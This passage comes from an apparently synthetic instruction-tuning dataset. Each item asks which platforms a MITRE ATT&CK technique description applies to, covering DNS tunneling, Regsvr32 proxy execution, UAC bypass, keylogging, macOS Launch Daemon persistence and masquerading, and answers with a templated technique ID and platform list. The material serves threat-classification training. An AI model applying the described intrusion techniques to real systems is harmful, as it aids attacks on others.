    "instruction": "What are the platforms that are related to the following technique description: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: DNS (T1071.004);\nTechnique Application Layer Protocol: DNS (T1071.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: DNS (T1071.004);\nTechnique Application Layer Protocol: DNS (T1071.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Binary Proxy Execution: Regsvr32 (T1218.010);\nTechnique System Binary Proxy Execution: Regsvr32 (T1218.010) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.",
      "answer": "The provided description is related to MITRE technique System Binary Proxy Execution: Regsvr32 (T1218.010);\nTechnique System Binary Proxy Execution: Regsvr32 (T1218.010) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
      "answer": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "answer": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Create or Modify System Process: Launch Daemon (T1543.004);\nTechnique Create or Modify System Process: Launch Daemon (T1543.004) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.",
      "answer": "The provided description is related to MITRE technique Create or Modify System Process: Launch Daemon (T1543.004);\nTechnique Create or Modify System Process: Launch Daemon (T1543.004) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
    "context": "",
    "output": "The provided description is related to MITRE technique Subvert Trust Controls: Code Signing (T1553.002);\nTechnique Subvert Trust Controls: Code Signing (T1553.002) is applicable to platforms: macOS, Windows;\nTherefore, the given procedure description is related to platforms: macOS, Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
      "answer": "The provided description is related to MITRE technique Subvert Trust Controls: Code Signing (T1553.002);\nTechnique Subvert Trust Controls: Code Signing (T1553.002) is applicable to platforms: macOS, Windows;\nTherefore, the given procedure description is related to platforms: macOS, Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
    "context": "",
    "output": "The provided description is related to MITRE technique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002);\nTechnique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
      "answer": "The provided description is related to MITRE technique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002);\nTechnique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Visual Basic (T1059.005);\nTechnique Command and Scripting Interpreter: Visual Basic (T1059.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Visual Basic (T1059.005);\nTechnique Command and Scripting Interpreter: Visual Basic (T1059.005) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.\n\nAdversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host.\n\nAn adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching) prior to the binary\u2019s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Compromise Host Software Binary (T1554);\nTechnique Compromise Host Software Binary (T1554) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.\n\nAdversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host.\n\nAn adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching) prior to the binary\u2019s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.",
      "answer": "The provided description is related to MITRE technique Compromise Host Software Binary (T1554);\nTechnique Compromise Host Software Binary (T1554) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.?",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious Link (T1204.001);\nTechnique User Execution: Malicious Link (T1204.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious Link (T1204.001);\nTechnique User Execution: Malicious Link (T1204.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Non-Standard Port (T1571);\nTechnique Non-Standard Port (T1571) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
      "answer": "The provided description is related to MITRE technique Non-Standard Port (T1571);\nTechnique Non-Standard Port (T1571) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
    "context": "",
    "output": "The provided description is related to MITRE technique Input Capture: Keylogging (T1056.001);\nTechnique Input Capture: Keylogging (T1056.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "answer": "The provided description is related to MITRE technique Input Capture: Keylogging (T1056.001);\nTechnique Input Capture: Keylogging (T1056.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Match Legitimate Name or Location (T1036.005);\nTechnique Masquerading: Match Legitimate Name or Location (T1036.005) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "answer": "The provided description is related to MITRE technique Masquerading: Match Legitimate Name or Location (T1036.005);\nTechnique Masquerading: Match Legitimate Name or Location (T1036.005) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: DNS (T1071.004);\nTechnique Application Layer Protocol: DNS (T1071.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: DNS (T1071.004);\nTechnique Application Layer Protocol: DNS (T1071.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
